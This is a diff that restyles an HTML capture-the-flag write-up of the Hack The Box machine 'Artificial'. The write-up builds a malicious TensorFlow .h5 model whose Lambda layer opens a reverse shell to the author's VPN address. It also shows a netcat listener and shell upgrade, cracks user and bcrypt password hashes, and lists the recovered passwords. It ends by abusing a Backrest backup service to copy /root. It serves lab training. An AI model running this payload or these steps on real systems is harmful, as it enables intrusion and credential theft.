@@ -1,49 +1,306 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Artificial &mdash; HTB Writeup</title>
-    <link rel="stylesheet" href="/style.css">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Artificial &mdash; HTB Writeup</title>
+<style>
+  :root {
+    --bg: #f7f7f9;
+    --fg: #1d1d1f;
+    --muted: #5a5a5f;
+    --card: #ffffff;
+    --border: #e2e2e6;
+    --code-bg: #f0f0f3;
+    --accent: #7c3aed;
+    --link: #5b21b6;
+  }
+  @media (prefers-color-scheme: dark) {
+    :root {
+      --bg: #121214;
+      --fg: #eaeaec;
+      --muted: #a0a0a6;
+      --card: #1b1b1e;
+      --border: #2d2d31;
+      --code-bg: #0f0f11;
+      --accent: #a78bfa;
+      --link: #c4b5fd;
+    }
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    background: var(--bg);
+    color: var(--fg);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    line-height: 1.65;
+  }
+  .wrap {
+    max-width: 760px;
+    margin: 0 auto;
+    padding: 2rem 1.25rem 4rem;
+  }
+  header.page-header {
+    display: flex;
+    align-items: center;
+    gap: 1.25rem;
+    border-bottom: 1px solid var(--border);
+    padding-bottom: 1.5rem;
+    margin-bottom: 1.5rem;
+    flex-wrap: wrap;
+  }
+  header.page-header img.machine-icon {
+    width: 96px;
+    height: 96px;
+    border-radius: 50%;
+    flex-shrink: 0;
+  }
+  header.page-header .meta h1 {
+    margin: 0 0 0.35rem;
+    font-size: 1.9rem;
+  }
+  header.page-header .meta .tags {
+    display: flex;
+    gap: 0.5rem;
+    flex-wrap: wrap;
+    margin-top: 0.5rem;
+  }
+  .badge {
+    display: inline-block;
+    font-size: 0.78rem;
+    padding: 0.2rem 0.6rem;
+    border-radius: 999px;
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    color: var(--muted);
+  }
+  .badge.difficulty-easy { color: #2e7d32; border-color: #2e7d3255; }
+  @media (prefers-color-scheme: dark) {
+    .badge.difficulty-easy { color: #81c995; }
+  }
+  nav.toc {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 1rem 1.25rem;
+    margin-bottom: 2rem;
+  }
+  nav.toc h2 {
+    margin-top: 0;
+    font-size: 1rem;
+    text-transform: uppercase;
+    letter-spacing: 0.04em;
+    color: var(--muted);
+  }
+  nav.toc ul {
+    margin: 0;
+    padding-left: 1.1rem;
+  }
+  nav.toc li { margin: 0.25rem 0; }
+  nav.toc a { color: var(--link); text-decoration: none; }
+  nav.toc a:hover { text-decoration: underline; }
+  h1, h2, h3 { line-height: 1.3; }
+  h2 {
+    margin-top: 2.5rem;
+    border-bottom: 1px solid var(--border);
+    padding-bottom: 0.3rem;
+  }
+  a { color: var(--link); }
+  p { margin: 1rem 0; }
+  code {
+    font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    background: var(--code-bg);
+    padding: 0.15rem 0.4rem;
+    border-radius: 5px;
+    font-size: 0.9em;
+  }
+  pre {
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 1rem;
+    overflow-x: auto;
+  }
+  pre code {
+    background: none;
+    padding: 0;
+    font-size: 0.88rem;
+  }
+  img {
+    max-width: 100%;
+    height: auto;
+    border-radius: 8px;
+    border: 1px solid var(--border);
+    display: block;
+    margin: 1.25rem 0;
+  }
+  figure {
+    margin: 1.5rem 0;
+  }
+  figcaption {
+    font-size: 0.85rem;
+    color: var(--muted);
+    text-align: center;
+    margin-top: 0.4rem;
+  }
+  blockquote.callout {
+    border-left: 4px solid var(--accent);
+    background: var(--card);
+    border-radius: 0 8px 8px 0;
+    padding: 0.75rem 1rem;
+    margin: 1.25rem 0;
+  }
+  blockquote.callout .callout-title {
+    font-weight: 600;
+    margin-bottom: 0.3rem;
+  }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1.25rem 0;
+  }
+  th, td {
+    border: 1px solid var(--border);
+    padding: 0.5rem 0.75rem;
+    text-align: left;
+  }
+  th { background: var(--code-bg); }
+  footer {
+    margin-top: 3rem;
+    padding-top: 1rem;
+    border-top: 1px solid var(--border);
+    color: var(--muted);
+    font-size: 0.85rem;
+  }
+
+  :root { --user: #2563eb; --pass: #dc2626; }
+  @media (prefers-color-scheme: dark) {
+    :root { --user: #60a5fa; --pass: #f87171; }
+  }
+  /* Inline commands, paths and filenames: terminal look */
+  code {
+    display: inline;
+    background: #0b0f0b;
+    color: #39ff14;
+    border: 1px solid #1f2a1f;
+    border-radius: 5px;
+    padding: 0.1rem 0.4rem;
+    font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    font-size: 0.88em;
+    word-break: break-word;
+  }
+  /* Commands and replies: terminal box with a Copy button */
+  .terminal-box {
+    background: #000;
+    color: #39ff14;
+    border: 1px solid #1f2a1f;
+    border-radius: 8px;
+    padding: 0.9rem 1rem;
+    font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    font-size: 0.88rem;
+    white-space: pre-wrap;
+    word-break: break-all;
+    overflow-wrap: break-word;
+  }
+  .terminal-wrapper { margin: 1.25rem 0; }
+  .terminal-header { display: flex; justify-content: flex-end; padding-bottom: 6px; }
+  .copy-btn {
+    font-size: 11px;
+    padding: 4px 10px;
+    border-radius: 4px;
+    cursor: pointer;
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    color: var(--link);
+  }
+  .copy-btn:hover { background: var(--accent); color: var(--bg); }
+  /* Credentials and flags: labelled boxes */
+  fieldset.cred-box, fieldset.flag-box {
+    border: 1px solid var(--border);
+    border-left: 4px solid var(--accent);
+    border-radius: 8px;
+    padding: 0.6rem 1rem 0.9rem;
+    margin: 1.25rem 0;
+    background: var(--card);
+  }
+  fieldset legend {
+    padding: 0 0.4rem;
+    font-size: 0.8rem;
+    font-weight: 600;
+    letter-spacing: 0.04em;
+    text-transform: uppercase;
+    color: var(--accent);
+  }
+  fieldset.flag-box {
+    background: #000;
+    border-color: #1f2a1f;
+    border-left: 4px solid #39ff14;
+    color: #39ff14;
+  }
+  fieldset.flag-box legend { color: #39ff14; }
+  fieldset.flag-box code { background: none; border: none; padding: 0; color: inherit; }
+  /* Usernames and passwords */
+  .user { color: var(--user); font-weight: 600; }
+  .pass { color: var(--pass); font-weight: 600; }
+  code .user { color: #60a5fa; }
+  code .pass { color: #f87171; }
+</style>
 </head>
 <body>
-    <main class="main-content">
-        <div class="content-card">
-<div class="writeup-content">
-    <div style="text-align: center;">
-        <h1>Hack The Box</h1>
-        <h2>Artificial</h2>
-        <img src="/pngs/HTB/Easy/Artificial/Artificial.png" alt="Artificial Banner" style="border:none; width: 300px; margin-bottom: 20px;">
-        <h3 style="color: #3fb950;">Level: Easy</h3>
+<div class="wrap">
+
+<header class="page-header">
+  <img class="machine-icon" src="/pngs/HTB/Easy/Artificial/Artificial.png" alt="Artificial machine icon from Hack The Box" loading="lazy">
+  <div class="meta">
+    <h1>Artificial</h1>
+    <div class="tags">
+      <span class="badge">Hack The Box</span>
+      <span class="badge">Linux</span>
+      <span class="badge difficulty-easy">Easy</span>
     </div>
+  </div>
+</header>
 
-    <p>Summary of the attack path:</p>
-    <ul>
-        <li><strong>Vulnerable model upload</strong> &mdash; a TensorFlow <code>.h5</code> file with a malicious Lambda layer, <strong>CVE-2025-9905</strong>.</li>
-        <li>Building the exploit in a Docker container that matches <code>tensorflow-cpu==2.13.1</code>.</li>
-        <li>Reading the app database and cracking the stored hashes.</li>
-        <li>Abusing a misconfigured local backup app (Backrest) to recover the root file.</li>
-    </ul>
+<nav class="toc">
+  <h2>Contents</h2>
+  <ul>
+    <li><a href="#summary">Summary</a></li>
+    <li><a href="#enumeration">1. Enumeration</a></li>
+    <li><a href="#foothold">2. Foothold</a></li>
+    <li><a href="#lateral-movement">3. Lateral Movement</a></li>
+    <li><a href="#privilege-escalation">4. Privilege Escalation</a></li>
+  </ul>
+</nav>
 
-    <h3 class="step-header">1. Enumeration</h3>
-    <p>I started with a full port scan:</p>
-    <div class="terminal-box">sudo nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 10.129.232.51</div>
+<h2 id="summary">Summary</h2>
+<p>Summary of the attack path:</p>
+<ul>
+  <li><strong>Vulnerable model upload</strong> &mdash; a TensorFlow <code>.h5</code> file with a malicious Lambda layer, <strong>CVE-2025-9905</strong>.</li>
+  <li>Building the exploit in a Docker container that matches <code>tensorflow-cpu==2.13.1</code>.</li>
+  <li>Reading the app database and cracking the stored hashes.</li>
+  <li>Abusing a misconfigured local backup app (Backrest) to recover the root file.</li>
+</ul>
 
-    <p>Next, I checked the versions of the open services and ran the default scripts:</p>
-    <div class="terminal-box">nmap -sVC -p 22,80 10.129.232.51
+<h2 id="enumeration">1. Enumeration</h2>
+<p>I started with a full port scan:</p>
+<div class="terminal-box">sudo nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 10.129.232.51</div>
+
+<p>Next, I checked the versions of the open services and ran the default scripts:</p>
+<div class="terminal-box">nmap -sVC -p 22,80 10.129.232.51
 
 //artificial.htb/</div>
 
-    <p>The HTTP port hosts a login page. I registered a new account there.</p>
+<p>The HTTP port hosts a login page. I registered a new account there.</p>
+<figure>
+  <img src="/pngs/HTB/Easy/Artificial/login-page.png" alt="Artificial login page" loading="lazy">
+</figure>
 
-    <img src="/pngs/HTB/Easy/Artificial/login-page.png" alt="Artificial login page" loading="lazy">
+<h2 id="foothold">2. Foothold</h2>
+<p>The requirements file for the app lists this package:</p>
+<div class="terminal-box">tensorflow-cpu==2.13.1</div>
 
-    <h3 class="step-header">2. Foothold</h3>
-    <p>The requirements file for the app lists this package:</p>
-    <div class="terminal-box">tensorflow-cpu==2.13.1</div>
-
-    <p>The upload function accepts <code>.h5</code> files, which are Keras model files. Searching for a vulnerability that combines this TensorFlow version with <code>.h5</code> models led me to <a href="https://github.com/Splinter0/tensorflow-rce/blob/main/exploit.py">CVE-2025-9905</a>. The script below builds a malicious <code>.h5</code> file. When the server loads the model, the <code>Lambda</code> layer runs my reverse shell.</p>
-    <div class="terminal-box">import tensorflow as tf
+<p>The upload function accepts <code>.h5</code> files, which are Keras model files. Searching for a vulnerability that combines this TensorFlow version with <code>.h5</code> models led me to <a href="https://github.com/Splinter0/tensorflow-rce/blob/main/exploit.py">CVE-2025-9905</a>. The script below builds a malicious <code>.h5</code> file. When the server loads the model, the <code>Lambda</code> layer runs my reverse shell.</p>
+<div class="terminal-box">import tensorflow as tf
 
 def exploit(x):
     import os
@@ -56,34 +313,34 @@ model.add(tf.keras.layers.Lambda(exploit))
 model.compile()
 model.save("exploit.h5")</div>
 
-    <p>The script needs the exact TensorFlow version from the requirements, so I ran it inside a Docker container.</p>
+<p>The script needs the exact TensorFlow version from the requirements, so I ran it inside a Docker container.</p>
 
-    <p>First, I created a working directory and moved into it:</p>
-    <div class="terminal-box">mkdir /tmp/test
+<p>First, I created a working directory and moved into it:</p>
+<div class="terminal-box">mkdir /tmp/test
 cd /tmp/test</div>
 
-    <p>After reading the <code>Dockerfile</code>, I downloaded the matching wheel (Python 3.8, <code>tensorflow_cpu 2.13.1</code>):</p>
-    <div class="terminal-box">curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl</div>
+<p>After reading the <code>Dockerfile</code>, I downloaded the matching wheel (Python 3.8, <code>tensorflow_cpu 2.13.1</code>):</p>
+<div class="terminal-box">curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl</div>
 
-    <p>Then I started a Python 3.8 container with the working directory mounted, and installed the wheel inside it:</p>
-    <div class="terminal-box">sudo docker run -it -v $(pwd):/tmp/test python:3.8-slim bash</div>
-    <div class="terminal-box">cd /tmp/test
+<p>Then I started a Python 3.8 container with the working directory mounted, and installed the wheel inside it:</p>
+<div class="terminal-box">sudo docker run -it -v $(pwd):/tmp/test python:3.8-slim bash</div>
+<div class="terminal-box">cd /tmp/test
 pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl</div>
 
-    <p>With the environment ready, I ran the exploit to generate <code>exploit.h5</code>. I uploaded the file and opened a listener on my machine. The upload triggered the shell as <code>app</code> on <code>artificial</code>.</p>
-    <div class="terminal-box">nc -lvnp 4444</div>
+<p>With the environment ready, I ran the exploit to generate <code>exploit.h5</code>. I uploaded the file and opened a listener on my machine. The upload triggered the shell as <code>app</code> on <code>artificial</code>.</p>
+<div class="terminal-box">nc -lvnp 4444</div>
 
-    <p>The reverse shell target (<code>10.10.14.235:4444</code>) must be my own VPN address, and the listener must be running before the upload.</p>
+<p>The reverse shell target (<code>10.10.14.235:4444</code>) must be my own VPN address, and the listener must be running before the upload.</p>
 
-    <p><strong>Shell upgrade</strong></p>
-    <p>The reverse shell has no proper terminal, so I upgraded it to a fully interactive one. On the target (<code>app@artificial</code>), I spawned a PTY:</p>
-    <div class="terminal-box">python3 -c 'import pty; pty.spawn("/bin/bash")'</div>
+<p><strong>Shell upgrade</strong></p>
+<p>The reverse shell has no proper terminal, so I upgraded it to a fully interactive one. On the target (<code>app@artificial</code>), I spawned a PTY:</p>
+<div class="terminal-box">python3 -c 'import pty; pty.spawn("/bin/bash")'</div>
 
-    <p>Then I pressed <strong>Ctrl + Z</strong> to background the shell. On my machine, I set the local terminal to raw mode and brought the shell back to the foreground:</p>
-    <div class="terminal-box">stty raw -echo ; fg</div>
+<p>Then I pressed <strong>Ctrl + Z</strong> to background the shell. On my machine, I set the local terminal to raw mode and brought the shell back to the foreground:</p>
+<div class="terminal-box">stty raw -echo ; fg</div>
 
-    <p>Next, I reset the terminal, started <code>screen</code>, and set the environment variables and terminal size:</p>
-    <div class="terminal-box">reset
+<p>Next, I reset the terminal, started <code>screen</code>, and set the environment variables and terminal size:</p>
+<div class="terminal-box">reset
 
 screen
 
@@ -93,16 +350,16 @@ export SHELL=bash
 
 stty rows 40 columns 100</div>
 
-    <h3 class="step-header">3. Lateral Movement</h3>
-    <p>Inside the application's <code>app.py</code>, I found the secret key and the database location:</p>
-    <div class="terminal-box">app.secret_key = "Sup3rS3cr3tKey4rtIfici4L"
+<h2 id="lateral-movement">3. Lateral Movement</h2>
+<p>Inside the application's <code>app.py</code>, I found the secret key and the database location:</p>
+<div class="terminal-box">app.secret_key = "Sup3rS3cr3tKey4rtIfici4L"
 
 app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'</div>
 
-    <p>The SQLite database is in the <code>instance</code> directory, so I opened it there:</p>
-    <div class="terminal-box">app@artificial:~/app/instance$ sqlite3 users.db</div>
+<p>The SQLite database is in the <code>instance</code> directory, so I opened it there:</p>
+<div class="terminal-box">app@artificial:~/app/instance$ sqlite3 users.db</div>
 
-    <div class="terminal-box">sqlite&gt; .tables
+<div class="terminal-box">sqlite&gt; .tables
 model  user
 
 sqlite&gt; select * from user;
@@ -113,51 +370,52 @@ sqlite&gt; select * from user;
 5|mary|mary@artificial.htb|bf041041e57f1aff3be7ea1abd6129d0
 6|test|test@htb.com|cc03e747a6afbbcbf8be7668acfebee5</div>
 
-    <p>The table stores password hashes for each user. I recovered two passwords:</p>
+<p>The table stores password hashes for each user. I recovered two passwords from these hashes:</p>
+<div class="terminal-box">gael:  c99175974b6e192936d97224638a34f8
+royer: bc25b1f80f544c0ab451c02a3dca9fc6</div>
+<fieldset class="cred-box">
+  <legend>Credentials</legend>
+  <code><span class="user">gael</span> : <span class="pass">mattp005numbertwo</span></code><br>
+  <code><span class="user">royer</span> : <span class="pass">marwinnarak043414036</span></code>
+</fieldset>
 
-    <fieldset class="cred-box">
-        <legend>Credentials</legend>
-        <code>gael:  c99175974b6e192936d97224638a34f8 : mattp005numbertwo</code><br>
-        <code>royer: bc25b1f80f544c0ab451c02a3dca9fc6 : marwinnarak043414036</code>
-    </fieldset>
+<p>Of these users, only <span class="user">gael</span> could log in over SSH:</p>
+<div class="terminal-box">ssh gael@10.129.232.51</div>
 
-    <p>Of these users, only <code>gael</code> could log in over SSH:</p>
-    <div class="terminal-box">ssh gael@10.129.232.51</div>
+<fieldset class="flag-box">
+  <legend>User Flag</legend>
+  <code>[REDACTED]</code>
+</fieldset>
 
-    <fieldset class="root-box">
-        <legend>User Flag</legend>
-        <code>[REDACTED]</code>
-    </fieldset>
+<h2 id="privilege-escalation">4. Privilege Escalation</h2>
+<p><strong>Root</strong></p>
+<p>I noticed that <span class="user">gael</span> is a member of the <code>sysadm</code> group, so I searched the filesystem for files that group can access:</p>
+<div class="terminal-box">find / -group sysadm -maxdepth 30 -ls 2&gt;/dev/null</div>
 
-    <h3 class="step-header">4. Privilege Escalation</h3>
-    <p><strong>Root</strong></p>
-    <p>I noticed that <code>gael</code> is a member of the <code>sysadm</code> group, so I searched the filesystem for files that group can access:</p>
-    <div class="terminal-box">find / -group sysadm -maxdepth 30 -ls 2&gt;/dev/null</div>
+<p>This revealed <code>/var/backups/backrest_backup.tar.gz</code>. I started a web server on the target and downloaded the file to my machine:</p>
+<div class="terminal-box">python3 -m http.server 8000</div>
+<div class="terminal-box">wget http://10.129.232.51:8000/backrest_backup.tar.gz</div>
 
-    <p>This revealed <code>/var/backups/backrest_backup.tar.gz</code>. I started a web server on the target and downloaded the file to my machine:</p>
-    <div class="terminal-box">python3 -m http.server 8000</div>
-    <div class="terminal-box">wget http://10.129.232.51:8000/backrest_backup.tar.gz</div>
+<p>Then I extracted the archive:</p>
+<div class="terminal-box">tar -xvf backrest_backup.tar.gz</div>
 
-    <p>Then I extracted the archive:</p>
-    <div class="terminal-box">tar -xvf backrest_backup.tar.gz</div>
-
-    <p>The archive contains a hidden directory with a <code>config.json</code> file:</p>
-    <div class="terminal-box">        "name": "backrest_root",
+<p>The archive contains a hidden directory with a <code>config.json</code> file:</p>
+<div class="terminal-box">        "name": "backrest_root",
         "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"</div>
 
-    <p>The value is Base64-encoded. Decoding it gives a bcrypt hash:</p>
-    <div class="terminal-box">$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO</div>
+<p>The value is Base64-encoded. Decoding it gives a bcrypt hash:</p>
+<div class="terminal-box">$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO</div>
 
-    <p>I saved the hash to a file and cracked it with hashcat (mode 3200 is bcrypt):</p>
-    <div class="terminal-box">hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt</div>
+<p>I saved the hash to a file and cracked it with hashcat (mode 3200 is bcrypt):</p>
+<div class="terminal-box">hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt</div>
 
-    <fieldset class="cred-box">
-        <legend>Credentials</legend>
-        <code>backrest_root : !@#$%^</code>
-    </fieldset>
+<fieldset class="cred-box">
+  <legend>Credentials</legend>
+  <code><span class="user">backrest_root</span> : <span class="pass">!@#$%^</span></code>
+</fieldset>
 
-    <p>Next, I checked which ports were listening locally:</p>
-    <div class="terminal-box">ss -tulpn
+<p>Next, I checked which ports were listening locally:</p>
+<div class="terminal-box">ss -tulpn
 
 ...&lt;SNIP&gt;...
 
@@ -166,44 +424,50 @@ tcp     LISTEN   0        4096           127.0.0.1:9898          0.0.0.0:*
 
 ...&lt;SNIP&gt;...</div>
 
-    <p>Port <code>9898</code> is bound only to localhost, so I forwarded it over SSH:</p>
-    <div class="terminal-box">ssh -L 9898:127.0.0.1:9898 gael@10.129.232.51</div>
+<p>Port <code>9898</code> is bound only to localhost, so I forwarded it over SSH:</p>
+<div class="terminal-box">ssh -L 9898:127.0.0.1:9898 gael@10.129.232.51</div>
 
-    <p>Then I opened <code>http://127.0.0.1:9898</code> in my browser, where the Backrest app was running.</p>
+<p>Then I opened <code>http://127.0.0.1:9898</code> in my browser, where the Backrest app was running.</p>
+<figure>
+  <img src="/pngs/HTB/Easy/Artificial/backrest-login.png" alt="Backrest login page on localhost:9898" loading="lazy">
+</figure>
 
-    <img src="/pngs/HTB/Easy/Artificial/backrest-login.png" alt="Backrest login page on localhost:9898" loading="lazy">
+<p>I logged in with the credentials I cracked earlier. While trying to add a plan, I found the app's guide, which explains how to set up a backup.</p>
+<figure>
+  <img src="/pngs/HTB/Easy/Artificial/plan-info.png" alt="Backrest plan information" loading="lazy">
+</figure>
+<figure>
+  <img src="/pngs/HTB/Easy/Artificial/plan-guide.png" alt="Backrest guide" loading="lazy">
+</figure>
 
-    <p>I logged in with the credentials I cracked earlier. While trying to add a plan, I found the app's guide, which explains how to set up a backup.</p>
+<p>The guide has three steps: <strong>Add repo</strong>, <strong>Add plan</strong>, and <strong>Back up now</strong>.</p>
+<figure>
+  <img src="/pngs/HTB/Easy/Artificial/add-repo.png" alt="Adding a repository in Backrest" loading="lazy">
+</figure>
+<figure>
+  <img src="/pngs/HTB/Easy/Artificial/add-plan.png" alt="Adding a plan in Backrest" loading="lazy">
+</figure>
 
-    <img src="/pngs/HTB/Easy/Artificial/plan-info.png" alt="Backrest plan information" loading="lazy">
+<p>I clicked <strong>Back Up Now</strong>. The green box on the right showed that the <code>/root</code> repository had been backed up.</p>
+<figure>
+  <img src="/pngs/HTB/Easy/Artificial/backup-now.png" alt="Backup completed, showing the /root repository" loading="lazy">
+</figure>
 
-    <img src="/pngs/HTB/Easy/Artificial/plan-guide.png" alt="Backrest guide" loading="lazy">
+<p>Since the backup contains <code>/root</code>, I used <strong>Restore to path</strong> to download a copy to my machine.</p>
+<figure>
+  <img src="/pngs/HTB/Easy/Artificial/restore-to-path.png" alt="Restore to path option in Backrest" loading="lazy">
+</figure>
 
-    <p>The guide has three steps: <strong>Add repo</strong>, <strong>Add plan</strong>, and <strong>Back up now</strong>.</p>
+<p>The download is a <code>.tar.gz</code> archive, so I extracted it:</p>
+<div class="terminal-box">tar -xvf archive-2026-04-02-22-44-04.tar.gz</div>
 
-    <img src="/pngs/HTB/Easy/Artificial/add-repo.png" alt="Adding a repository in Backrest" loading="lazy">
+<fieldset class="flag-box">
+  <legend>Root Flag</legend>
+  <code>[REDACTED]</code>
+</fieldset>
 
-    <img src="/pngs/HTB/Easy/Artificial/add-plan.png" alt="Adding a plan in Backrest" loading="lazy">
-
-    <p>I clicked <strong>Back Up Now</strong>. The green box on the right showed that the <code>/root</code> repository had been backed up.</p>
-
-    <img src="/pngs/HTB/Easy/Artificial/backup-now.png" alt="Backup completed, showing the /root repository" loading="lazy">
-
-    <p>Since the backup contains <code>/root</code>, I used <strong>Restore to path</strong> to download a copy to my machine.</p>
-
-    <img src="/pngs/HTB/Easy/Artificial/restore-to-path.png" alt="Restore to path option in Backrest" loading="lazy">
-
-    <p>The download is a <code>.tar.gz</code> archive, so I extracted it:</p>
-    <div class="terminal-box">tar -xvf archive-2026-04-02-22-44-04.tar.gz</div>
-
-    <fieldset class="root-box">
-        <legend>Root Flag</legend>
-        <code>[REDACTED]</code>
-    </fieldset>
 </div>
-        </div>
-    </main>
-    <script src="/copy.js"></script>
-    <script src="/nav.js"></script>
+<script src="/copy.js"></script>
+<script src="/nav.js"></script>
 </body>
 </html>
